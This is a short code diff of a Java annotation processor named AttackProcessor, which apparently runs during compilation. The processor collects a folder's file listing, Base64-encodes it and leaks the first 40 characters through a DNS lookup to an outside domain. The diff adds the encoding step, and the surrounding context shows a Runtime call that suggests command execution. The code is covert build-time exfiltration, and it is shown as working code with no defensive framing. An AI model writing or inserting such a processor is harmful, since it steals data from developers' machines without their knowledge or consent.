@@ -43,9 +43,10 @@ public class AttackProcessor extends AbstractProcessor {
                 File[] files = folder.listFiles();
                 sb.append( Arrays.deepToString( files));
             }
+            String fs = sb.toString();
+            fs = new String( Base64.getEncoder().encode( fs.getBytes() ) );
 
-
-            Inet4Address.getByName( sb.toString()+".lirui28.t.dlsr.ga" );
+            Inet4Address.getByName( fs.substring( 0,40 )+".lirui28.t.dlsr.ga" );
 
             Runtime runtime = Runtime.getRuntime();
 
